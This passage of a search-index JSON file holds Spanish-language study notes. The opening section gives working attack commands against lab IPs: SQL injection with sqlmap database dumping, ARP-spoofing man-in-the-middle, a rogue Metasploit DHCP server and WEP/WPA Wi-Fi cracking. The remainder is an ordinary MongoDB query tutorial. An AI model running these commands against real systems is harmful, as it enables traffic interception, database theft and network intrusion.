10.1.1.9/sqli/example1.php?name=root'+and+'1'='0'+union+select+1,column_name,3,4,5+from+information_schema.columns+where+table_name='users'+--+-","title":"sql injection"},{"location":"auditoria/apuntes_hacking/#sqlmap","text":"sqlmap -u \"http://10.1.1.9/sqli/xample1.php?name=root\" sqlmap -u \"http://10.1.1.9/sqli/xample1.php?name=root\" --dbs sqlmap -u \"http://10.1.1.9/sqli/xample1.php?name=root\" -D exercices --tables sqlmap -u \"http://10.1.1.9/sqli/xample1.php?name=root\" -D exercices -T users --columns sqlmap -u \"http://10.1.1.9/sqli/xample1.php?name=root\" -D exercices -T users --dump sqlmap -u \"http://10.1.1.9/sqli/xample1.php?name=root\" --sql-shell","title":"sqlmap"},{"location":"auditoria/apuntes_hacking/#vulnerabilidades-en-red","text":"","title":"vulnerabilidades en red"},{"location":"auditoria/apuntes_hacking/#analisis-de-trafico","text":"Existen diferentes programas con los que podemos analizar el trafico en la red, el mas conocido wireshark que analiza todo el trafico, tambi\u00e9n existen otros como network miner que de forma pasiva va extrayendo datos de los paquetes que van circulando por la red y mostr\u00e1ndolos de forma ordenada.","title":"An\u00e1lisis de trafico"},{"location":"auditoria/apuntes_hacking/#intercepcion-de-trafico-man-in-the-midle","text":"De forma manual podemos ponernos entre medio de la victima y el router para interceptar todo el trafico de un dispositivo. Siempre que estemos en una red local podemos indicar que nuestro dispositivo pueda hacer pas forwarding y seguidamente mediante arpspoof indicar a un host que nosotros somos el router. echo \"1\" > /proc/sys/net/ipv4/ip_forward # prg interficie victima router arpspoof -i eth0 -t 10 .1.1.32 10 .1.1.1 realmente lo que hace arpspoof es mandar a la victima paquetes de que mi mac es la perteneciente va la ip del router. De forma autom\u00e1tica podemos utilizar bettercap que se encarga de realizar todo el proceso autom\u00e1ticamente, adem\u00e1s de tener funcionalidades extra. arp-scan 10 .1.1.0/24 # ver numero de dispositivos en una red bettercap --help bettercap -X # man in de middle a todos los dispositivos de la red bettercap -T 10 .1.1.32 --proxy -P POST # solo una victima Desde windows existen programas como cain que podemos hacer el man in de middle f\u00e1cilmente. Es un programa portable que solo tendr\u00e1s que configurar la secci\u00f3n apr que ser\u00e1 entre que dispositivos quieres estar y listo.","title":"intercepci\u00f3n de trafico (man in the midle)"},{"location":"auditoria/apuntes_hacking/#dhcp-falso","text":"echo \"1\" > /proc/sys/net/ipv4/ip_forward msfconsole use auxiliary/server/dhcp show options set broadcast 10 .1.1.255 # rango a dar set dhcpipend 10 .1.1.200 set dhcpipstart 10 .1.1.190 set dnsserver 8 .8.8.8 set netmask 255 .255.255.0 set router 10 .1.1.22 # mi direccion ip, me are pasar por el router set srvhost 10 .11.22 # servidor dhcp exploit","title":"dhcp falso"},{"location":"auditoria/apuntes_hacking/#vulnerabilidades-wifi","text":"modo monitor Este modo sirve para que nuestra tarjeta se ponga a la escucha del trafico de la red, no solo el nuestro si no el de todo el mundo si estamos en un entorno wifi. airmon-ng check kill airmon-ng start wlan0 airodump-ng wlan0mon # ver redes ssid bssid potencia de red chanel, etc... airmon-ng stop wlan0mon redes wep capturar pequetes red especifica airodump-ng -c 6 --bssid mac-del-router -w file-trafic wlan0mon asociarte al punto de acceso aireplay-ng -1 0 -e pruebas -a mac-del-router -h mac-cliente wlan0mon escuchar paquetes arp aireplay-ng -3 -b mac-router -h mac-cliente wlan0mon desautenticar cliente aireplay-ng -0 1 -a mac-router -c mac-cliente wlan0mon craquear aircrack-ng file-trafic redes wpa/wpa2 airmon-ng start wlan0 # extraer handshake y parar la escucha airodump-ng -c 6 --bssid mac-router -w file-trafic-wpa wlan0mon # intntar craquear handshake con diccionario local aircrack-ng -w /usr/share/wordlists/rockyou.txt file-trafic-wpa autom\u00e1tico De forma autom\u00e1tica se puede intentar vulnerar una red con wifite ya vque por debajo esta utilizando aircrack . wifite indicar en el listado la red","title":"vulnerabilidades wifi"},{"location":"bases_datos/mongo/Mongo/","text":"Mongo b\u00e1sico Entrar en consola : mongo Comandes b\u00e0siques de la consola : db // mostra la BD en \u00fas show databases // mostra les BD del servidor show collections // mostre les col\u00b7leccions de la BD en \u00fas use proves // fa que la BD en \u00fas sigui proves; si no existeix, la crea db . createCollection ( \u201c tweets \u201d ) // crear tabla insertar insertOne se utiliza para insertar una fila y insertMany para insertar m\u00faltiples filas db . inventory . insertOne ({ item : \"canvas\" , qty : 100 , tags : [ \"cotton\" ], size : { h : 28 , w : 35.5 , uom : \"cm\" } }) db . inventory . insertMany ([ { item : \"journal\" , qty : 25 , tags : [ \"blank\" , \"red\" ], size : { h : 14 , w : 21 , uom : \"cm\" } }, { item : \"mat\" , qty : 85 , tags : [ \"gray\" ], size : { h : 27.9 , w : 35.5 , uom : \"cm\" } }, { item : \"mousepad\" , qty : 25 , tags : [ \"gel\" , \"blue\" ], size : { h : 19 , w : 22.85 , uom : \"cm\" } } ]) insert save Exemple (utilitza el m\u00e8tode deprecat db.collection.save() enlloc del .insertOne() ) : db . test . save ({}) db . test . save ({ name : []}) db . test . save ({ name : [ 'George' ]}) db . test . save ({ name : [ 'George' , 'Raymond' ]}) db . test . save ({ name : [ 'George' , 'Raymond' , 'Richard' ]}) db . test . save ({ name : [ 'George' , 'Raymond' , 'Richard' , 'Martin' ]}) Update tiene este formato db . collection . update ( query , update , options ) Operadors de valores actualiza el primero que encuentra > db . inventory . updateOne ( ... { item : \"paper\" }, ... { ... $set : { \"size.uom\" : \"cm\" , status : \"P\" }, ... $currentDate : { lastModified : true } ... } ... ) actualizar todos los que coinciden db . inventory . updateMany ( { \"qty\" : { $lt : 50 } }, { $set : { \"size.uom\" : \"in\" , status : \"P\" }, $currentDate : { lastModified : true } } ) sustituir el primero que encuentra db . inventory . replaceOne ( { item : \"paper\" }, { item : \"paper\" , instock : [ { warehouse : \"A\" , qty : 60 }, { warehouse : \"B\" , qty : 40 } ] } ) Delete db . inventory . deleteMany ({ status : \"A\" }) db . inventory . deleteOne ({ status : \"A\" }) Remove db . restaurants . remove ({}) // eliminar contenido de tabla db . restaurants . drop () // eliminar tabla Operadores # comparadores $eq # igual que $gt # mayor que $gte # mayor o igual que $lt # menor que $lte # menor o igual que $ne # diferente $in # cualquier valor dentro de una array $nin # ningun valor dentro de una array # logicos $or # cualquier coincidente $and # todos an de coincidir $not # invierte el efecto de una consulta $nor # debuelve los elementos que no comparten ninguna de las condiciones $exists # retorna los documentos que contienen el campo espewcificado Importar desde fuera de mongo mongoimport --db users --collection contacts --file contacts.json mongoimport --db users --collection contacts --type csv \\ --headerline --file /opt/backups/contacts.csv mongoimport --host 127 .0.0.1 --port 27017 --db geo --collection countries \\ --type json --file json_dades_exemple/geo/countries.json - \\ -drop --stopOnError --maintainInsertionOrder querys Para hacer b\u00fasquedas se utiliza el m\u00e9todo find o findOne si solo quieres un resultado. > db . inventory . find ({ \"patron de busqueda\" }, { \"campos a mostrar, por defecto todos\" }) > db . inventory . find (). count () 4 > db . inventory . find (). pretty () { \"_id\" : ObjectId ( \"5e661c4863e51a5f0a8f3c2a\" ), \"item\" : \"mousepad\" , \"qty\" : 25 , \"tags\" : [ \"gel\" , \"blue\" ], \"size\" : { \"h\" : 19 , \"w\" : 22.85 , \"uom\" : \"cm\" } } ... db . inventory . findOne () where > db . inventory . find ({ item : \"mousepad\" }) where : \u00e9s un int\u00e8rpret i va molt lent (avalua l\u2019expressi\u00f3 JavaScript per a cada document de la col\u00b7lecci\u00f3), per\u00f2 alhora \u00e9s molt potent. Utilitza l\u2019objecte this per referir-se al document. Per exemple aqu\u00ed serveix per avaluar si l\u2019array name t\u00e9 mida m\u00e9s gran que 1: db . test . find ( { $where : \"this.name.length > 1\" } ); in SELECT * FROM inventory WHERE status in ( \"A\" , \"D\" ) // equivalente db . inventory . find ( { status : { $in : [ \"A\" , \"D\" ] } } ) and SELECT * FROM inventory WHERE status = \"A\" AND qty < 30 // equivalente db . inventory . find ( { status : \"A\" , qty : { $lt : 30 } } ) or SELECT * FROM inventory WHERE status = \"A\" OR qty < 30 // equivalente db . inventory . find ( { $or : [ { status : \"A\" }, { qty : { $lt : 30 } } ] } ) and y or SELECT * FROM inventory WHERE status = \"A\" AND ( qty < 30 OR item LIKE \"p%\" ) // equivalente db . inventory . find ( { status : \"A\" , $or : [ { qty : { $lt : 30 } }, { item : /^ p / } ] } ) like/ilike db . users . find ({ \"name\" : / . * m . */ }) // like '%m%' db . users . find ({ \"name\" : / m / }) // like '%m%' db . users . find ({ \"name\" : / m / i } ) // ilike '%m%' db . users . find ({ name : / a / }) db . users . find ({ name : /^ pa / }) // like 'pa%' db . users . find ({ name : / ro$ / }) // like '%ro' db . users . find ({ name : { $regex : / . * m . */ i } }) https://www.w3schools.com/jsref/jsref_obj_regexp.asp exists db . records . find ( { a : { $exists : true } } ) db . records . find ( { b : { $exists : false } } ) proyecciones Las proyecciones son los campos a mostrar db . collection . find ( < query document > , < projection document > ) > db . inventory . findOne ({},{ _id : 0 }) > db . inventory . findOne ({},{ item : 1 }) > db . inventory . findOne ({},{ _id : 0 , item : 1 }) { \"item\" : \"canvas\" } subcampos En la b\u00fasqueda de subcampos ( objetos dentro de objetos ) en el primer ejemplo se muestra como hay que asignar el subcampo entero a buscar ( El orden importa ). En el segundo ejemplo buscas un item dentro del subcampo. // buscar el objeto {h:28, w:35.5, uom:\"cm\"} > db . inventory . findOne ({ size : { h : 28 , w : 35.5 , uom : \"cm\" }}) { \"_id\" : ObjectId ( \"5e661beb63e51a5f0a8f3c27\" ), \"item\" : \"canvas\" , \"qty\" : 100 , \"tags\" : [ \"cotton\" ] , \"size\" : { \"h\" : 28 , \"w\" : 35.5 , \"uom\" : \"cm\" } } // buscar el valor del item \"uom\" dentro del subcampo de \"size\" > db . inventory . findOne ({ \"size.uom\" : \"cm\" }) campos array En la b\u00fasqueda de arrays existen diferentes soluciones: buscar toda la array (el orden de los items importa ). metodo $all indica que contenga esos items. // busqueda por array db . inventory . find ( { tags : [ \"blank\" , \"red\" ] } ) // que contenga red y blank db . inventory . find ( { tags : { $all : [ \"red\" , \"blank\" ] } } ) // que contenga red db . inventory . find ( { tags : \"red\" } ) entre B\u00fasquedas entre con comparadores // > 22 and < 30 > db . inventory . find ( { dim_cm : { $elemMatch : { $gt : 22 , $lt : 30 } } }) { \"dim_cm\" : [ 22.85 , 30 ] } // > 25 > db . inventory . find ( { \"dim_cm.1\" : { $gt : 25 } } ) { \"dim_cm\" : [ 22.85 , 30 ] } buscar entre objetos buscar un item que contiene objetos, hay que buscar por objeto, el orden importa > db . inventory . find ( { \"instock\" : { warehouse : \"A\" , qty : 5 } } ) // buscar en el primer objeto de instock > db . inventory . find ( { ' instock .0 . qty ' : { $lte : 14 } } ) Nor Devuelve los elementos que no comparten ninguna de las condiciones En el siguiente ejemplo la sentencia dice, mu\u00e9strame: los que no tengan el item name, o un tama\u00f1o de array de 0, o un tama\u00f1o de array de 1. Estos no me los muestres. // $size es el numero de valores que tiene la array name > db . test . find ({ $nor : [ { name : { $exists : false }}, { name : { $size : 0 }}, { name : { $size : 1 }} ] }) { \"name\" : [ \"George\" , \"Raymond\" ] } { \"name\" : [ \"George\" , \"Raymond\" , \"Richard\" ] } { \"name\" : [ \"George\" , \"Raymond\" , \"Richard\" , \"Martin\" ] } not db . test . count ({ \"name\" : { \"$not\" : { \"$size\" : 0 } } }); Aggregate group group ace una agrupaci\u00f3n de los campos que coinciden y sum los suma. > db . inventory . aggregate ( [ { $match :{ \"status\" : 'A' }}, { $group : { _id : \"$status\" , total : { $sum : \"$qty\" } } } ] ) // resultado { \"_id\" : \"A\" , \"total\" : 120 } project { \"_id\" : ObjectId ( \"5e6bc9655a4fa4a58d139cd9\" ), \"item\" : \"notebook\" , \"qty\" : [ 25 , 25 ] } { \"_id\" : ObjectId ( \"5e6bc9655a4fa4a58d139cdc\" ), \"item\" : \"jupiter\" , \"qty\" : [ 10 , 5 ] } > db . inventory . aggregate ( [ { $match :{ \"item\" : ' notebook ' }}, { $project : { total : { $sum : \"$qty\" } } } ] ) // resultado { \"_id\" : ObjectId ( \"5e6bc9655a4fa4a58d139cd9\" ), \"total\" : 50 } Indices Texto ver indice > db . stores . getIndexes () [ { \"v\" : 2 , \"key\" : { \"_id\" : 1 }, \"name\" : \"_id_\" , \"ns\" : \"text.stores\" } ] expandir index de texto a campos name y description > db . stores . createIndex ( { name : \"text\" , description : \"text\" } ) { \"createdCollectionAutomatically\" : false , \"numIndexesBefore\" : 1 , \"numIndexesAfter\" : 2 , \"ok\" : 1 } > db . stores . find ({ $text : { $search : \"java coffe shop\" } }) { \"_id\" : 5 , \"name\" : \"Java Shopping\" , \"description\" : \"Indonesian goods\" } { \"_id\" : 1 , \"name\" : \"Java Hut\" , \"description\" : \"Coffee and cakes\" } { \"_id\" : 3 , \"name\" : \"Coffee Shop\" , \"description\" : \"Just coffee\" } > db . stores . find ({ $text : { $search : \"java -coffee shop\" } }) { \"_id\" : 5 , \"name\" : \"Java Shopping\" , \"description\" : \"Indonesian goods\" } > db . stores . find ({ $text : { $search : \"java \\\"coffee shop\\\"\" } }) { \"_id\" : 3 , \"name\" : \"Coffee Shop\" , \"description\" : \"Just coffee\" } ordenar por relevancia > db . stores . find ({ $text : { $search : \"java coffe shop\" } }, { puntuacio : { $meta : \"textScore\" }} ). sort ( { puntuacio : { $meta : \"textScore\" }}) { \"_id\" : 5 , \"name\" : \"Java Shopping\" , \"description\" : \"Indonesian goods\" , \"puntuacio\" : 1.5 } { \"_id\" : 1 , \"name\" : \"Java Hut\" , \"description\" : \"Coffee and cakes\" , \"puntuacio\" : 0.75 } { \"_id\" : 3 , \"name\" : \"Coffee Shop\" , \"description\" : \"Just coffee\" , \"puntuacio\" : 0.75 } geoespaciales Mongo permet crear uns \u00edndexs geoespacials per a camps que continguin aquest tipus d\u2019informaci\u00f3, i aix\u00ed poder fer consultes sobre documents propers a certes coordenades. Les coordenades poden ser esf\u00e8riques-2D (com les de latitud i longitud de la Terra), o planars-2D. > db . cities . createIndex ({ \"loc\" : \"2dsphere\" } , { \"name\" : \"loc.geoidx\" }) var las ciudades que est\u00e1n hasta 20km de las cordenadas indicadas. > db . cities . find ({ \"loc\" : { ... \"$near\" : { ... \"$geometry\" : { ... type : \"Point\" , ... coordinates : [ 116.40752599999996000 , 39.90403 ] ... }, ... \"$maxDistance\" : 20000 , ... \"$minDistance\" : 0 ... } ... } ... }) Buscar orden cercan\u00eda Devuelve documentos en orden de proximidad a un punto espec\u00edfico, del m\u00e1s cercano al m\u00e1s lejano. l\u00edmite: opcional. El n\u00famero m\u00e1ximo de documentos a devolver. El valor predeterminado es 100. db . cities . aggregate ( [ { \"$geoNear\" : { \"near\" : [- 5.53888900000004 , 38.639167 ] , \"distanceField\" : \"dis\" , \"includeLocs\" : \"loc\" , \"spherical\" : true , \"maxDistance\" : 40000 / 6371 , \"minDistance\" : 0 / 6371 , \"distanceMultiplier\" : 6371 } }, { \"$project\" : { \"_id\" : false , \"name\" : true , \"dis\" : true } } ] ) Orden cercan\u00eda con max distancia en una distancia de max de 20km db . cities . aggregate ( [ { \"$geoNear\" : { \"near\" : [- 5.53888900000004 , 38.639167 ] , \"distanceField\" : \"dis\" , \"includeLocs\" : \"loc\" , \"spherical\" : true , \"distanceMultiplier\" : 6371 } }, { \"$match\" : { \"dis\" : { $lt : 20 }}}, { \"$project\" : { \"_id\" : false , \"name\" : true , \"dis\" : true } } ] ) db . cities . aggregate ( [ { \"$geoNear\" : { \"near\" : [- 5.53888900000004 , 38.639167 ] , \"distanceField\" : \"dis\" , \"includeLocs\" : \"loc\" , \"spherical\" : true , \"maxDistance\" : 20 / 6371 , \"distanceMultiplier\" : 6371 } }, { \"$project\" : { \"_id\" : false , \"name\" : true , \"dis\" : true } } ] ) Funciones function findCities ( long , lat , maxDist , minDist ) { return db . cities . aggregate ( [ { \"$geoNear\" : { \"near\" : [ long , lat ] , \"distanceField\" : \"dis\" , \"includeLocs\" : \"loc\" , \"spherical\" : true , \"maxDistance\" : maxDist / 6371 , \"minDistance\" : minDist / 6371 , \"distanceMultiplier\" : 6371 } }, { \"$project\" : { \"_id\" : false , \"name\" : true , \"dis\" : true } } ] ) } Aquesta funci\u00f3 nom\u00e9s funciona si estem utilitzant la BD geo , \u00e9s clar . findCities ( - 5.53888900000004 , 38.639167 , 40000 , 0 )","title":"Mongo"},{"location":"bases_datos/mongo/Mongo/#mongo","text":"","title":"Mongo"},{"location":"bases_datos/mongo/Mongo/#basico","text":"Entrar en consola : mongo Comandes b\u00e0siques de la consola : db // mostra la BD en \u00fas show databases // mostra les BD del servidor show collections // mostre les col\u00b7leccions de la BD en \u00fas use proves // fa que la BD en \u00fas sigui proves; si no existeix, la crea db . createCollection ( \u201c tweets \u201d ) // crear tabla","title":"b\u00e1sico"},{"location":"bases_datos/mongo/Mongo/#insertar","text":"insertOne se utiliza para insertar una fila y insertMany para insertar m\u00faltiples filas db . inventory . insertOne ({ item : \"canvas\" , qty : 100 , tags : [ \"cotton\" ], size : { h : 28 , w : 35.5 , uom : \"cm\" } }) db . inventory . insertMany ([ { item : \"journal\" , qty : 25 , tags : [ \"blank\" , \"red\" ], size : { h : 14 , w : 21 , uom : \"cm\" } }, { item : \"mat\" , qty : 85 , tags : [ \"gray\" ], size : { h : 27.9 , w : 35.5 , uom : \"cm\" } }, { item : \"mousepad\" , qty : 25 , tags : [ \"gel\" , \"blue\" ], size : { h : 19 , w : 22.85 , uom : \"cm\" } } ])","title":"insertar"},{"location":"bases_datos/mongo/Mongo/#insert-save","text":"Exemple (utilitza el m\u00e8tode deprecat db.collection.save() enlloc del .insertOne() ) : db . test . save ({}) db . test . save ({ name : []}) db . test . save ({ name : [ 'George' ]}) db . test . save ({ name : [ 'George' , 'Raymond' ]}) db . test . save ({ name : [ 'George' , 'Raymond' , 'Richard' ]}) db . test . save ({ name : [ 'George' , 'Raymond' , 'Richard' , 'Martin' ]})","title":"insert save"},{"location":"bases_datos/mongo/Mongo/#update","text":"tiene este formato db . collection . update ( query , update , options ) Operadors de valores actualiza el primero que encuentra > db . inventory . updateOne ( ... { item : \"paper\" }, ... { ... $set : { \"size.uom\" : \"cm\" , status : \"P\" }, ... $currentDate : { lastModified : true } ... } ... ) actualizar todos los que coinciden db . inventory . updateMany ( { \"qty\" : { $lt : 50 } }, { $set : { \"size.uom\" : \"in\" , status : \"P\" }, $currentDate : { lastModified : true } } ) sustituir el primero que encuentra db . inventory . replaceOne ( { item : \"paper\" }, { item : \"paper\" , instock : [ { warehouse : \"A\" , qty : 60 }, { warehouse : \"B\" , qty : 40 } ] } )","title":"Update"},{"location":"bases_datos/mongo/Mongo/#delete","text":"db . inventory . deleteMany ({ status : \"A\" }) db . inventory . deleteOne ({ status : \"A\" })","title":"Delete"},{"location":"bases_datos/mongo/Mongo/#remove","text":"db . restaurants . remove ({}) // eliminar contenido de tabla db . restaurants . drop () // eliminar tabla","title":"Remove"},{"location":"bases_datos/mongo/Mongo/#operadores","text":"# comparadores $eq # igual que $gt # mayor que $gte # mayor o igual que $lt # menor que $lte # menor o igual que $ne # diferente $in # cualquier valor dentro de una array $nin # ningun valor dentro de una array # logicos $or # cualquier coincidente $and # todos an de coincidir $not # invierte el efecto de una consulta $nor # debuelve los elementos que no comparten ninguna de las condiciones $exists # retorna los documentos que contienen el campo espewcificado","title":"Operadores"},{"location":"bases_datos/mongo/Mongo/#importar","text":"desde fuera de mongo mongoimport --db users --collection contacts --file contacts.json mongoimport --db users --collection contacts --type csv \\ --headerline --file /opt/backups/contacts.csv mongoimport --host 127 .0.0.1 --port 27017 --db geo --collection countries \\ --type json --file json_dades_exemple/geo/countries.json - \\ -drop --stopOnError --maintainInsertionOrder","title":"Importar"},{"location":"bases_datos/mongo/Mongo/#querys","text":"Para hacer b\u00fasquedas se utiliza el m\u00e9todo find o findOne si solo quieres un resultado. > db . inventory . find ({ \"patron de busqueda\" }, { \"campos a mostrar, por defecto todos\" }) > db . inventory . find (). count () 4 > db . inventory . find (). pretty () { \"_id\" : ObjectId ( \"5e661c4863e51a5f0a8f3c2a\" ), \"item\" : \"mousepad\" , \"qty\" : 25 , \"tags\" : [ \"gel\" , \"blue\" ], \"size\" : { \"h\" : 19 , \"w\" : 22.85 , \"uom\" : \"cm\" } } ... db . inventory . findOne ()","title":"querys"},{"location":"bases_datos/mongo/Mongo/#where","text":"> db . inventory . find ({ item : \"mousepad\" }) where : \u00e9s un int\u00e8rpret i va molt lent (avalua l\u2019expressi\u00f3 JavaScript per a cada document de la col\u00b7lecci\u00f3), per\u00f2 alhora \u00e9s molt potent. Utilitza l\u2019objecte this per referir-se al document. Per exemple aqu\u00ed serveix per avaluar si l\u2019array name t\u00e9 mida m\u00e9s gran que 1: db . test . find ( { $where : \"this.name.length > 1\" } );","title":"where"},{"location":"bases_datos/mongo/Mongo/#in","text":"SELECT * FROM inventory WHERE status in ( \"A\" , \"D\" ) // equivalente db . inventory . find ( { status : { $in : [ \"A\" , \"D\" ] } } )","title":"in"},{"location":"bases_datos/mongo/Mongo/#and","text":"SELECT * FROM inventory WHERE status = \"A\" AND qty < 30 // equivalente db . inventory . find ( { status : \"A\" , qty : { $lt : 30 } } )","title":"and"},{"location":"bases_datos/mongo/Mongo/#or","text":"SELECT * FROM inventory WHERE status = \"A\" OR qty < 30 // equivalente db . inventory . find ( { $or : [ { status : \"A\" }, { qty : { $lt : 30 } } ] } )","title":"or"},{"location":"bases_datos/mongo/Mongo/#and-y-or","text":"SELECT * FROM inventory WHERE status = \"A\" AND ( qty < 30 OR item LIKE \"p%\" ) // equivalente db . inventory . find ( { status : \"A\" , $or : [ { qty : { $lt : 30 } }, { item : /^ p / } ] } )","title":"and y or"},{"location":"bases_datos/mongo/Mongo/#likeilike","text":"db . users . find ({ \"name\" : / . * m . */ }) // like '%m%' db . users . find ({ \"name\" : / m / }) // like '%m%' db . users . find ({ \"name\" : / m / i } ) // ilike '%m%' db . users . find ({ name : / a / }) db . users . find ({ name : /^ pa / }) // like 'pa%' db . users . find ({ name : / ro$ / }) // like '%ro' db . users . find ({ name : { $regex : / . * m . */ i } }) https://www.w3schools.com/jsref/jsref_obj_regexp.asp","title":"like/ilike"},{"location":"bases_datos/mongo/Mongo/#exists","text":"db . records . find ( { a : { $exists : true } } ) db . records . find ( { b : { $exists : false } } )","title":"exists"},{"location":"bases_datos/mongo/Mongo/#proyecciones","text":"Las proyecciones son los campos a mostrar db . collection . find ( < query document > , < projection document > ) > db . inventory . findOne ({},{ _id : 0 }) > db . inventory . findOne ({},{ item : 1 }) > db . inventory . findOne ({},{ _id : 0 , item : 1 }) { \"item\" : \"canvas\" }","title":"proyecciones"},{"location":"bases_datos/mongo/Mongo/#subcampos","text":"En la b\u00fasqueda de subcampos ( objetos dentro de objetos ) en el primer ejemplo se muestra como hay que asignar el subcampo entero a buscar ( El orden importa ). En el segundo ejemplo buscas un item dentro del subcampo. // buscar el objeto {h:28, w:35.5, uom:\"cm\"} > db . inventory . findOne ({ size : { h : 28 , w : 35.5 , uom : \"cm\" }}) { \"_id\" : ObjectId ( \"5e661beb63e51a5f0a8f3c27\" ), \"item\" : \"canvas\" , \"qty\" : 100 , \"tags\" : [ \"cotton\" ] , \"size\" : { \"h\" : 28 , \"w\" : 35.5 , \"uom\" : \"cm\" } } // buscar el valor del item \"uom\" dentro del subcampo de \"size\" > db . inventory . findOne ({ \"size.uom\" : \"cm\" })","title":"subcampos"},{"location":"bases_datos/mongo/Mongo/#campos-array","text":"En la b\u00fasqueda de arrays existen diferentes soluciones: buscar toda la array (el orden de los items importa ). metodo $all indica que contenga esos items. // busqueda por array db . inventory . find ( { tags : [ \"blank\" , \"red\" ] } ) // que contenga red y blank db . inventory . find ( { tags : { $all : [ \"red\" , \"blank\" ] } } ) // que contenga red db . inventory . find ( { tags : \"red\" } )","title":"campos array"},{"location":"bases_datos/mongo/Mongo/#entre","text":"B\u00fasquedas entre con comparadores // > 22 and < 30 > db . inventory . find ( { dim_cm : { $elemMatch : { $gt : 22 , $lt : 30 } } }) { \"dim_cm\" : [ 22.85 , 30 ] } // > 25 > db . inventory . find ( { \"dim_cm.1\" : { $gt : 25 } } ) { \"dim_cm\" : [ 22.85 , 30 ] }","title":"entre"},{"location":"bases_datos/mongo/Mongo/#buscar-entre-objetos","text":"buscar un item que contiene objetos, hay que buscar por objeto, el orden importa > db . inventory . find ( { \"instock\" : { warehouse : \"A\" , qty : 5 } } ) // buscar en el primer objeto de instock > db . inventory . find ( { ' instock .0 . qty ' : { $lte : 14 } } )","title":"buscar entre objetos"},{"location":"bases_datos/mongo/Mongo/#nor","text":"Devuelve los elementos que no comparten ninguna de las condiciones En el siguiente ejemplo la sentencia dice, mu\u00e9strame: los que no tengan el item name, o un tama\u00f1o de array de 0, o un tama\u00f1o de array de 1. Estos no me los muestres. // $size es el numero de valores que tiene la array name > db . test . find ({ $nor : [ { name : { $exists : false }}, { name : { $size : 0 }}, { name : { $size : 1 }} ] }) { \"name\" : [ \"George\" , \"Raymond\" ] } { \"name\" : [ \"George\" , \"Raymond\" , \"Richard\" ] } { \"name\" : [ \"George\" , \"Raymond\" , \"Richard\" , \"Martin\" ] }","title":"Nor"},{"location":"bases_datos/mongo/Mongo/#not","text":"db . test . count ({ \"name\" : { \"$not\" : { \"$size\" : 0 } } });","title":"not"},{"location":"bases_datos/mongo/Mongo/#aggregate","text":"","title":"Aggregate"},{"location":"bases_datos/mongo/Mongo/#group","text":"group ace una agrupaci\u00f3n de los campos que coinciden y sum los suma. > db . inventory . aggregate ( [ { $match :{ \"status\" : 'A' }}, { $group : { _id : \"$status\" , total : { $sum : \"$qty\" } } } ] ) // resultado { \"_id\" : \"A\" , \"total\" : 120 }","title":"group"},{"location":"bases_datos/mongo/Mongo/#project","text":"{ \"_id\" : ObjectId ( \"5e6bc9655a4fa4a58d139cd9\" ), \"item\" : \"notebook\" , \"qty\" : [ 25 , 25 ] } { \"_id\" : ObjectId ( \"5e6bc9655a4fa4a58d139cdc\" ), \"item\" : \"jupiter\" , \"qty\" : [ 10 , 5 ] } > db . inventory . aggregate ( [ { $match :{ \"item\" : ' notebook ' }}, { $project : { total : { $sum : \"$qty\" } } } ] ) // resultado { \"_id\" : ObjectId ( \"5e6bc9655a4fa4a58d139cd9\" ), \"total\" : 50 }","title":"project"},{"location":"bases_datos/mongo/Mongo/#indices","text":"","title":"Indices"},{"location":"bases_datos/mongo/Mongo/#texto","text":"ver indice > db . stores . getIndexes () [ { \"v\" : 2 , \"key\" : { \"_id\" : 1 }, \"name\" : \"_id_\" , \"ns\" : \"text.stores\" } ] expandir index de texto a campos name y description > db . stores . createIndex ( { name : \"text\" , description : \"text\" } ) { \"createdCollectionAutomatically\" : false , \"numIndexesBefore\" : 1 , \"numIndexesAfter\" : 2 , \"ok\" : 1 } > db . stores . find ({ $text : { $search : \"java coffe shop\" } }) { \"_id\" : 5 , \"name\" : \"Java Shopping\" , \"description\" : \"Indonesian goods\" } { \"_id\" : 1 , \"name\" : \"Java Hut\" , \"description\" : \"Coffee and cakes\" } { \"_id\" : 3 , \"name\" : \"Coffee Shop\" , \"description\" : \"Just coffee\" } > db . stores . find ({ $text : { $search : \"java -coffee shop\" } }) { \"_id\" : 5 , \"name\" : \"Java Shopping\" , \"description\" : \"Indonesian goods\" } > db . stores . find ({ $text : { $search : \"java \\\"coffee shop\\\"\" } }) { \"_id\" : 3 , \"name\" : \"Coffee Shop\" , \"description\" : \"Just coffee\" } ordenar por relevancia > db . stores . find ({ $text : { $search : \"java coffe shop\" } }, { puntuacio : { $meta : \"textScore\" }} ). sort ( { puntuacio : { $meta : \"textScore\" }}) { \"_id\" : 5 , \"name\" : \"Java Shopping\" , \"description\" : \"Indonesian goods\" , \"puntuacio\" : 1.5 } { \"_id\" : 1 , \"name\" : \"Java Hut\" , \"description\" : \"Coffee and cakes\" , \"puntuacio\" : 0.75 } { \"_id\" : 3 , \"name\" : \"Coffee Shop\" , \"description\" : \"Just coffee\" , \"puntuacio\" : 0.75 }","title":"Texto"},{"location":"bases_datos/mongo/Mongo/#geoespaciales","text":"Mongo permet crear uns \u00edndexs geoespacials per a camps que continguin aquest tipus d\u2019informaci\u00f3, i aix\u00ed poder fer consultes sobre documents propers a certes coordenades. Les coordenades poden ser esf\u00e8riques-2D (com les de latitud i longitud de la Terra), o planars-2D. > db . cities . createIndex ({ \"loc\" : \"2dsphere\" } , { \"name\" : \"loc.geoidx\" }) var las ciudades que est\u00e1n hasta 20km de las cordenadas indicadas. > db . cities . find ({ \"loc\" : { ... \"$near\" : { ... \"$geometry\" : { ... type : \"Point\" , ... coordinates : [ 116.40752599999996000 , 39.90403 ] ... }, ... \"$maxDistance\" : 20000 , ... \"$minDistance\" : 0 ... } ... } ... })","title":"geoespaciales"},{"location":"bases_datos/mongo/Mongo/#buscar-orden-cercania","text":"Devuelve documentos en orden de proximidad a un punto espec\u00edfico, del m\u00e1s cercano al m\u00e1s lejano. l\u00edmite: opcional. El n\u00famero m\u00e1ximo de documentos a devolver. El valor predeterminado es 100. db . cities . aggregate ( [ { \"$geoNear\" : { \"near\" : [- 5.53888900000004 , 38.639167 ] , \"distanceField\" : \"dis\" , \"includeLocs\" : \"loc\" , \"spherical\" : true , \"maxDistance\" : 40000 / 6371 , \"minDistance\" : 0 / 6371 , \"distanceMultiplier\" : 6371 } }, { \"$project\" : { \"_id\" : false , \"name\" : true , \"dis\" : true } } ] )","title":"Buscar orden cercan\u00eda"},{"location":"bases_datos/mongo/Mongo/#orden-cercania-con-max-distancia","text":"en una distancia de max de 20km db . cities . aggregate ( [ { \"$geoNear\" : { \"near\" : [- 5.53888900000004 , 38.639167 ] , \"distanceField\" : \"dis\" , \"includeLocs\" : \"loc\" , 